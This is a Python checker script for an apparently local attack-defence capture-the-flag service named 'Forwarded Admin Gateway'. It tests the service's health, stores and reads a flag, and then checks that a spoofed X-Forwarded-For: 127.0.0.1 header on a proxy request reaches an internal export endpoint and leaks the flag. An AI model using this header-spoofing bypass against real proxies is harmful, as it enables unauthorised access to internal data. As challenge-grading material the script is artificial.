import json
import os
import sys
import time
import urllib.request
from urllib.parse import quote


BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:18132"
TOKEN = os.environ.get("CHECKER_TOKEN", "demo-checker-token")


def fail(message):
    raise SystemExit(f"checker failed: {message}")


def expect(condition, message):
    if not condition:
        fail(message)


def with_retry(fn, attempts=10, delay=0.5):
    last_error = None
    for attempt in range(attempts):
        try:
            return fn()
        except Exception as exc:  # noqa: BLE001
            last_error = exc
            if attempt == attempts - 1:
                raise
            time.sleep(delay)
    raise last_error


def get(path):
    with urllib.request.urlopen(BASE + path, timeout=5) as resp:
        return resp.status, resp.read().decode(errors="replace")


def get_json(path):
    status, body = get(path)
    try:
        return status, json.loads(body)
    except json.JSONDecodeError:
        fail(f"{path} did not return JSON: {body[:120]}")


def checker_get(path):
    req = urllib.request.Request(BASE + path, headers={"X-AWD-Checker-Token": TOKEN})
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status, resp.read().decode(errors="replace")


def put(path, body):
    req = urllib.request.Request(
        BASE + path,
        data=body.encode(),
        method="PUT",
        headers={"X-AWD-Checker-Token": TOKEN},
    )
    with urllib.request.urlopen(req, timeout=5) as resp:
        return resp.status, resp.read().decode(errors="replace")


status, payload = get_json("/health")
expect(status == 200 and payload.get("status") == "ok", "health endpoint is not healthy")
status, body = get("/")
expect(status == 200 and "Forwarded Admin Gateway" in body, "index page missing")
status, body = get("/reports/demo")
expect(status == 200 and "blue-lab" in body, "demo report is unavailable")
flag = "flag{local_forwarded_admin_gateway_check}"
status, _ = put("/api/flag", flag)
expect(status == 200, "put_flag failed")
status, body = checker_get("/api/flag")
expect(status == 200 and flag in body, "get_flag did not return the flag written by put_flag")
target_path = quote("/internal/export?tenant=blue-lab", safe="")
req = urllib.request.Request(
    BASE + "/proxy?path=" + target_path,
    headers={"X-Forwarded-For": "127.0.0.1"},
)
body = with_retry(lambda: urllib.request.urlopen(req, timeout=5).read().decode(errors="replace"))
expect(flag in body, "forwarded-header exploit path did not recover the current flag")
print("ok awd-forwarded-admin-gateway")
